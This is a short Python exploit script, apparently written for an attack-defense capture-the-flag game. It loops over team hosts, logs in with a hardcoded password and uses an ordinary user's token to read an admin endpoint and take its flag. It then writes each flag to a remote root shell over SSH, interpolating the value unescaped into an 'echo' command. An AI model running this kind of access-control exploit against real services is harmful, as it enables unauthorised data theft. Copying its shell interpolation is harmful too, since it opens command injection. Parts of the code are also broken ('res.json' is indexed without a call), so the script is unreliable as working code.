import requests
import paramiko


def connect_ssh_submission(ip, username, content):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    rsa_key = paramiko.RSAKey.from_private_key_file(f'/home/xza/Documents/repoak/ctf-gameserver-terraform/proxmox/output/team2/team2-sshkey')
    try:
        client.connect(ip, username = username, pkey=rsa_key)
        stdin, stdout, stderr = client.exec_command('mkdir -p /root && echo "{}" > /root/xxx.flag'.format(content))
        # SSH connection cleanup
        client.close()
    except (paramiko.AuthenticationException, paramiko.SSHException) as e:
        print("Error: ", e)

def get_flag(ip):
    url = f"http://{ip}:8008/api/v1"
    res = requests.post(f'{url}/login', data={'username': 'user', 'password': 'pasahitz_sekretua'})

    headers={'Authorization': f'Bearer {res.json['access_token']}'}
    user = requests.get(f'{url}/user/admin', headers=headers)
    user_json = user.json()
    return user_json['flag']


port = 8822
team_count = 2
ip_mask = '10.0.%d.101'
while True:
    for team_number in range(0, team_count+1):
        ip = ip_mask % team_number
        content = get_flag(ip)
        if content is None:
            print("Team", team_number, " NOT successfull")
        else:
            print("Team: ", team_number, "\nContent: ", content,)
            connect_ssh_submission ('10.0.1.1','root',content)